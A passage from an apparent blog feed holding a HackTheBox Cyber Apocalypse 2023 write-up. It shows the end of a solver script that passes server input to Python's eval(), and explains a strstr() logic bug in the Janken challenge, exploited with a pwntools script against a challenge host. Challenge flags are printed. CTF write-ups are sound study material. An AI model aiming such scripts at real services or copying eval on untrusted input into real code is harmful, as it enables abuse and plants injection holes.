    <span class="n">query</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" = "</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">] query: </span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ans</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="c1"># Wr1t1ng s4f3 c0d3 1s my p45510n :)
</span>      <span class="k">if</span> <span class="n">ans</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mi">1337</span> <span class="ow">or</span> <span class="n">ans</span> <span class="o">&gt;</span> <span class="mi">1337</span><span class="p">:</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="s">"MEM_ERR"</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="s">"%.2f"</span> <span class="o">%</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ZeroDivisionError</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="s">"DIV0_ERR"</span>
    <span class="k">except</span> <span class="nb">SyntaxError</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="s">"SYNTAX_ERR"</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] </span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ans</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">break</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>HTB{d1v1d3_bY_Z3r0_3rr0r}
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="janken">Janken</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<blockquote>
  <p>As you approach an ancient tomb, you’re met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there’s a catch: you must win 100 rounds in a row to pass. Fail to do so, and you’ll be denied entry.</p>
</blockquote>

<p><img src="/assets/img/20230323155229.png" alt="" /></p>

<p>After a bit of reversing, the function <code class="language-plaintext highlighter-rouge">game()</code> was found to be responsible for playing a round and deciding the winner. It uses the standard C function <code class="language-plaintext highlighter-rouge">strstr()</code> to check if the choice made by computer (the <em>needle</em>), which can be <code class="language-plaintext highlighter-rouge">rock</code>, <code class="language-plaintext highlighter-rouge">paper</code>, or <code class="language-plaintext highlighter-rouge">scissors</code>, matches that made by user (the <em>haystack</em>). If it does, user wins.</p>

<p>Since <code class="language-plaintext highlighter-rouge">strstr()</code> scans the whole haystack for a match independent of position, and the program does not implement any length validation during the check, a user can simply enter the combination of all three possible choices (<code class="language-plaintext highlighter-rouge">rock</code> + <code class="language-plaintext highlighter-rouge">paper</code> + <code class="language-plaintext highlighter-rouge">scissors</code>), which will always make <code class="language-plaintext highlighter-rouge">strstr()</code> to return non-zero, giving user the win. I automated this in a simple script;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------
# Janken - Cyber Apocalypse 2023 solution.
#                          Author: 4g3nt47
#-----------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"161.35.168.118"</span><span class="p">,</span> <span class="mi">30716</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">99</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"rockpaperscissors"</span><span class="p">)</span>
  <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>[+] You are worthy! Here is your prize: HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}
</pre></td></tr></tbody></table></code></pre></div></div>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="web" /><category term="linux" /><category term="windows" /><category term="jeopardy" /><category term="ctf" /><category term="forensics" /><category term="web" /><category term="misc" /><category term="reversing" /><category term="competiton" /><summary type="html"><![CDATA[Cyber Apocalypse 2023 is a very nice jeopardy-style CTF competition hosted by HackTheBox. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.]]></summary></entry></feed>